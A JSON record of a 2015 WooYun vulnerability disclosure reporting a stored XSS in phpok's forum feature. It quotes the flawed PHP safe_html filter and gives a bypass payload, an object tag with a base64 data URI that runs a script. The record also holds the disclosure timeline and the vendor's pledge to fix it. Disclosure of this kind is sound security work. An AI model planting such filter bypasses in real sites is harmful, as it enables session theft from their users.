{"id": 33816, "wybug_id": "wooyun-2015-0107925", "wybug_title": "phpok（safe_html)绕过导致储存型xss", "wybug_corp": "phpok.com", "wybug_author": "Pany自留地", "wybug_date": "2015-04-20 10:51", "wybug_open_date": "2015-07-19 11:38", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-19：\t细节向公众公开  简要描述： phpok（论坛BBS功能） 存储型xss 详细说明：  public function safe_html($content,$clear_url='')\t{\t\t$content = preg_replace_callback('/<(.+)>/isU',array($this,'_clean_xss_on'),$content);\t\t//清除带src和href里的信息\t\t$content = preg_replace_callback(\"/<(.*)(src|href)\\s*=(\\\"|')(.+)(\\\\3)(.*)>/isU\",array($this,'_clean_xss_script'),$content);\t\t//清除src传递没有引号的数据\t\t$content = preg_replace_callback(\"/<(.*)(src|href)\\s*=([^\\s>]+)([\\s|\\/|>])/isU\",array($this,'_clean_xss_script2'),$content);\t\t//清除script,applet,style,title,iframe等不安全信息\t\t$content = preg_replace(\"/<(^[script|applet|style|title|iframe|frame|frameset|link]+).*>[.\\n\\t\\r]*<\\/\\\\1>/isU\",'',$content);\t\t$content = preg_replace(\"/<\\/?link.*?>/isU\",\"\",$content);\t\t//清除meta信息\t\t$content = preg_replace('/<meta(.+)>/isU','',$content);      .........\t\treturn $content;\t}绕过测试：\n<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\">\n\n\nCOOkie获取测试：\n\n   漏洞证明：  \n\n   修复方案：  继续过滤～   版权声明：转载请注明来源 Pany自留地@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2015-04-20 11:37 厂商回复： 收到，会在4.3版本修正这个Bug。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}